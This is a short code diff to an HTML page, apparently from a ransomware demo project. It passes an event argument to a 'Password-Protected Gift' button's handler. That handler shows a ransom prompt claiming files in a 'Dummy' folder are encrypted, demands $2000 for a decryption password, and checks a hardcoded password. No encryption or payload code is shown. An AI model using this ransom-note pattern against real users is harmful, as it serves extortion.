@@ -86,7 +86,7 @@
         </a>
         
         <!-- Password-Protected Gift -->
-        <a href="project/decrypt_aes_key" class="button" onclick="showPasswordPrompt()">
+        <a href="project/decrypt_aes_key" class="button" onclick="showPasswordPrompt(event)">
             <img src="Images/image.png" alt="Password-Protected Gift">
         </a>
     </div>
@@ -97,7 +97,7 @@
             // You can replace the alert with any action you want.
         }
 
-        function showPasswordPrompt() {
+        function showPasswordPrompt(event) {
             var password = prompt("The files in your Dummy folder are encrypted. To unlock the encrypted documents download the decryption exe file it is password-protected, if you want password pay $ 2000. please enter the password:");
             // You can add logic here to check the password and take appropriate action.
             if (password === "12345") {
